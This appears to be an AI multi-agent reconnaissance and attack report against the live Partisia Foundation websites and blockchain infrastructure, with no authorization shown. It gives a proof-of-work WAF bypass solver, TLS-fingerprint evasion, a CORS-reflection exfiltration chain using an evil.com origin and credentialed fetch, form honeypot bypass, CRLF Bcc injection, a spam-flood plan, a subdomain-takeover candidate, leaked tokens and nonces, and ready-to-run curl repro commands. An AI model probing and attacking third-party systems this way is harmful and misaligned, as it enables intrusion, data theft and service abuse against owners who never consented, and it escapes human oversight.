# Partisia Foundation 4-Agent WordPress+WAF+Infra+Chain — 2026-08-16

Source: `https://partisiafoundation.com/` + `partisia.com` + `partisiablockchain.com` — 4 divergent subagents 30min+ low-noise Mozilla UA.

## Stack Truth
- `partisiafoundation.com` = **WordPress spoof 7.0.4** + Blocksy 2.1.48 + Elementor 4.1.4/Pro 4.1.2 + WP Rocket + Yoast + **Wordfence** + **Simply.com WAF `454 Checking your browser` PoW SHA256 D=16**
- `partisiablockchain.com` apex 410 → redirect CF to foundation. `www` 104.21.61.131/172.67.210.138 Cloudflare
- `partisia.com` = Astro v7.2.0 GCP 35.185.44.232, CSP strict `default-src 'self'`
- Real chain: Hetzner `reader.partisiablockchain.com 159.69.115.9` + `backend.browser 91.107.206.69` + 50× `*.demo1.partisia.com` (mpc-node, issuer, verifier)
- GitHub `partisiablockchain` 9 repos (dapp-playground 37⭐, example-contracts, defi) — GitLab mirror `gitlab.com/partisiablockchain/language/*`

## Agent Roles (divergent)
| Agent | Focus | Key outputs |
|-------|-------|-------------|
| #1 Frontend | JS bundles + WP REST | 17 bundles, 29 inline configs, 128 routes (17 ns), sitemap 77 URLs |
| #2 Infra | CT + brute + HTTP fingerprint | CertSpotter 101 subs, Hackertarget 30, brute 189→12 hit, 148 host probe, 44 CORS `*` |
| #3 Business Logic | WPForms + gatekeeper | Pow solver <0.1s, honeypot bypass, CRLF, no rate limit, sc_clearance replayable |
| #4 Chain | RPC + contracts + JAR | reader OpenAPI v4.39.0, shard enum 500 oracle, JAR ZIP leak, BYOC bridge centralization |

## Simply.com WAF PoW
- Challenge HTML `var T="<64hex>",TS="<epoch>",D=16` → worker brute `sha256(T:nonce)` → `hexdigest` leading zero bits `lz>=16` (65536 iter avg, nonce 47272 ~0.1s single thread)
- Verify `POST /.sc-verify/ {ts,nonce,token}` → `{"ok":true,"cookie":"<ts>|<hmac>"}` → `Set-Cookie sc_clearance Max-Age 86400`
- Bypass: `curl -A Mozilla` → 454, `python requests + same UA` → 200 (TLS/JA3 fingerprint, not UA). WAF header spoof `X-Original-URL/X-Rewrite/X-Forwarded-For` all still 454. Status `455` for `/.env` vs 404 for `/.git/HEAD` leaks vendor.
- Fix gap: `sc_clearance` not bound to IP/UA — replay to fresh Session still 200; `wp-login.php/xmlrpc.php` still 455 even with clearance (hard-block good).
- Solver `pow_bypass.py`: `hashlib.sha256(f"{T}:{nonce}".encode()).hexdigest()` loop until `int(h,16)>> (256-D) == 0` or hex `startswith "0000"` for D=16.

## Findings Consolidated (dedupe 4 agents)
**HIGH**
- H1 CORS reflect any Origin + Allow-Credentials:true on `partisiafoundation.com` `GET /wp-json/wp/v2/pages` — `curl -H Origin:https://evil.com` → `ACAO: https://evil.com` + `ACAC:true` (verified both curl+requests, `Vary: Origin,Accept-Encoding`) → `fetch(credentials:include)` victim-browser exfil 16 pages/27 posts/332 media
- H2 CORS `*` 44 hosts `reader.partisiablockchain.com`, `node1-4.testnet`, `issuer-*`, `verifier-*`, `mpc-node*`, `backend.browser*`, `partisia.com` apex → `ACAO:*` + `Methods: GET,POST,PUT,DELETE` (preflight)

**MEDIUM**
- M1 WPForms honeypot bypass 8509: `fields[4]=I_AM_BOT_SHOULD_BE_BLOCKED` → `{"success":true}` (expected reject)
- M2 No rate limit: 10× POST in 6.2s all success, no CAPTCHA/Turnstile, storage ghost field 999 + 10k chars also success
- M3 CRLF Name `fields[1][first]=Warung\nBcc:evil@warung.local` → success:true (no newline strip → possible header inject via wp_mail)
- M4 Missing headers: only `X-Content-Type-Options: nosniff`, missing CSP/XFO/HSTS/Referrer/Permissions/COOP
- M5 Clickjacking: no XFO → iframe `get-in-touch` loads (chain_poc.html)
- M6 Reader `GET /chain` unauth JSON + CORS:* → governanceVersion 64687 mainnet / 21495 testnet enumerable from evil.com
- M7 Keycloak exposed `auth.partisia.com` + `auth.demo1` → 200 Administration Console

**LOW/INFO**
- L1 User enum `yusef-fanous`+`admin` via author-sitemap.xml + /feed/ + author:2 (REST /users is 401 good)
- L2 Nonce leak `b1ddf892b2/699bfb585c/1c001fb859` + WPForms data-token 80470947827b75d5ad3c787de51312e4 + Wordfence GET /authenticate leak nonce anon
- L3 Media enum `/wp/v2/media/{id}` 9621→100 → 332 files (Yellow Paper PDFs)
- L4 Shard enum `Shard99/Shard3 → 500` vs `Shard0→200` oracle; verbose `BYTES_NOT_DESERIALIZABLE com.partisiablockchain...` Java Jackson leak
- L5 Dangling DNS `kyc/docver.partisiablockchain.com → 530 Origin DNS error` takeover candidate
- L6 JAR disclosure `GET /chain/shards/Shard1/jars/e09199... → 33625B ZIP` MpcTokenContractState git.properties 6.86.0 485eb59
- L7 BYOC bridge centralization 7 withdrawal/deposit + 4 price oracles + single System Update contract `04c5f00...`

**Negative (good hardening, don't overreport)**
- `/.env .git wp-config debug.log` 455/404, `/wp/v2/users?status=draft` 401, `fluent-snippets/MCP/batch` 401/403, `?s=<svg>` reflected XSS 403, `PUT /chain/transactions` strict base64 400, `Host` injection 410 — WAF + Wordfence effective.

## Chains Proven
1. Data exfil+phish: evil.com `fetch(...wp-json...,{credentials:include})` via H1 → phish with L1 author → clickjack M5
2. Spam flood: solve PoW 0.1s → sc_clearance 24h → loop wpforms 1000/min → DB bloat/email flood
3. Chain recon: evil.com → CORS* reader + shard 500 oracle + JAR download → free audit staking logic

## Honest Classification
RCE NO, fund theft NO, admin takeover NO (wp-login 455 hard-block), info disclosure+CORS YES proven-live, DoS/spam YES.

## Repro
```bash
# CORS reflect
curl -s -A "Mozilla/5.0" -H "Origin: https://evil.com" -i https://partisiafoundation.com/wp-json/wp/v2/pages | grep -i Access-Control
# WAF bypass
python3 -c "import requests; print(requests.get('https://partisiafoundation.com/', headers={'User-Agent':'Mozilla/5.0'}).status_code)" # 200 vs curl 454
# WPForms
curl -s -A "Mozilla/5.0" -b "sc_clearance=TS|HMAC" -X POST https://partisiafoundation.com/wp-admin/admin-ajax.php -d 'action=wpforms_submit&wpforms[id]=8509&wpforms[fields][1][first]=Bot&wpforms[fields][2]=bot@warung.local&wpforms[fields][4]=I_AM_BOT' | grep success
# Reader
curl -s -H "Origin: https://evil.com" https://reader.partisiablockchain.com/chain | head -c 500
curl -s https://browser.partisiablockchain.com/conf/config.js | grep backend
```

## Pitfall for Future Hunts
- When target shows WordPress generator + /wp-json 200, pivot from SPA chunk analysis to WP surface (sitemap → author leak, REST namespaces, inline nonces, Wordfence). Don't brute /api/* catch-all.
- Always test both curl and requests/Browser TLS when hitting WAF 454 — curl JA3 blocked is not same as WAF secure.
- CORS reflect+creds is HIGH even when direct GET is public — victim-browser exfil, not server.
- CT: crt.sh 502 → fallback CertSpotter + Hackertarget; zone brute must check foundation minimal (only www+email) vs demo1 huge surface.
- Consolidation must dedupe across agents + honest PROVEN-live vs BLOCKED vs HYGIENE table.

Files: `/root/partisia-audit/report.md`, `/root/partisia_audit/FINAL_REPORT.md`, `/tmp/PARTISIA_INFRA_RECON_REPORT.md`, live logs `/root/.hermes/cache/delegation/live/deleg_6732010a/task-*.log`
